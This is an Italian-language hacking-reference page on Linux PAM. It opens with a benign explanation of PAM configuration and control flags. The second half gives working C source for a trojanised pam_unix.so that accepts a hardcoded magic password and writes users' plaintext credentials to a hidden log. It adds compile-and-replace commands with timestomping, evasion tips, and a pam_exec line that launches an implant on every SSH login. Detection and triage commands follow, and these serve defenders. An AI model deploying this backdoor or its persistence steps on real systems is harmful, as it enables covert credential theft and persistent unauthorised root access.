# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informazioni di base

**PAM (Pluggable Authentication Modules)** agisce come un meccanismo di sicurezza che **verifica l'identità degli utenti che tentano di accedere ai servizi del sistema**, controllando il loro accesso in base a vari criteri. È simile a un guardiano digitale, assicurando che solo utenti autorizzati possano utilizzare servizi specifici e, se necessario, limitandone l'uso per prevenire il sovraccarico del sistema.

#### File di configurazione

- **Solaris e i sistemi basati su UNIX** tipicamente utilizzano un file di configurazione centrale situato in `/etc/pam.conf`.
- **I sistemi Linux** preferiscono un approccio basato su directory, memorizzando le configurazioni specifiche per servizio in `/etc/pam.d`. Ad esempio, il file di configurazione per il servizio di login si trova in `/etc/pam.d/login`.

Un esempio di configurazione PAM per il servizio di login potrebbe essere il seguente:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Ambiti di gestione PAM**

Questi ambiti, o gruppi di gestione, includono **auth**, **account**, **password** e **session**, ognuno responsabile di diversi aspetti del processo di autenticazione e della gestione della sessione:

- **Auth**: Convalida l'identità dell'utente, spesso richiedendo una password.
- **Account**: Gestisce la verifica dell'account, controllando condizioni come l'appartenenza a gruppi o restrizioni per fascia oraria.
- **Password**: Gestisce gli aggiornamenti delle password, inclusi controlli di complessità o la prevenzione di attacchi dizionario.
- **Session**: Gestisce azioni durante l'inizio o la fine di una sessione di servizio, come il montaggio di directory o l'impostazione dei limiti di risorse.

#### **PAM Module Controls**

I controlli determinano la risposta del modulo a successo o fallimento, influenzando il processo di autenticazione complessivo. Questi includono:

- **Required**: Il fallimento di un modulo marcato required comporta un fallimento finale, ma solo dopo che tutti i moduli successivi sono stati verificati.
- **Requisite**: Terminazione immediata del processo al verificarsi di un fallimento.
- **Sufficient**: Un successo salta il resto dei controlli dello stesso ambito a meno che un modulo successivo non fallisca.
- **Optional**: Causa fallimento solo se è l'unico modulo nello stack.

#### Scenario di esempio

In una configurazione con più moduli auth, il processo segue un ordine preciso. Se il modulo `pam_securetty` rileva che il terminale di login non è autorizzato, i login di root vengono bloccati; tuttavia tutti i moduli vengono comunque processati a causa del suo stato "required". Il `pam_env` imposta variabili d'ambiente, aiutando potenzialmente l'esperienza utente. I moduli `pam_ldap` e `pam_unix` lavorano insieme per autenticare l'utente, con `pam_unix` che tenta di usare una password precedentemente fornita, migliorando efficienza e flessibilità nei metodi di autenticazione.


## Backdooring PAM – Hooking `pam_unix.so`

Un trucco classico per la persistenza in ambienti Linux ad alto valore è **swap the legitimate PAM library with a trojanised drop-in**.  Poiché ogni login SSH / console finisce per chiamare `pam_unix.so:pam_sm_authenticate()`, poche righe di C sono sufficienti per catturare credenziali o implementare una *magic* password bypass.

### Riepilogo compilazione
<details>
<summary>Esempio di `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compila e stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Consigli OpSec
1. **Atomic overwrite** – scrivere su un file temporaneo e `mv` al posto giusto per evitare librerie scritte a metà che bloccherebbero SSH.
2. La posizione del file di log, ad es. `/usr/bin/.dbus.log`, si confonde con artefatti desktop legittimi.
3. Mantenere gli export dei simboli identici (`pam_sm_setcred`, ecc.) per evitare malfunzionamenti di PAM.

### Rilevamento
* Confrontare MD5/SHA256 di `pam_unix.so` con il pacchetto della distro.
* `rpm -V pam` o `debsums -s libpam-modules` per individuare librerie sostituite senza hash manuale.
* Controllare la presenza di file scrivibili da tutti o proprietà insolite sotto `/lib/security/`.
* Regola `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Cerca nei file di configurazione PAM moduli inaspettati: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abuso di `pam_exec` per persistence
Invece di sostituire `pam_unix.so`, un approccio più leggero è aggiungere una riga `pam_exec` in `/etc/pam.d/sshd` in modo che ogni login SSH avvii un implant lasciando intatto lo stack normale:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` viene eseguito come root all'interno del contesto PAM di sshd, quindi lo script può drop reverse shells, collect env vars o re-open implanted sockets senza modifiche al filesystem delle librerie core.


## Riferimenti

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
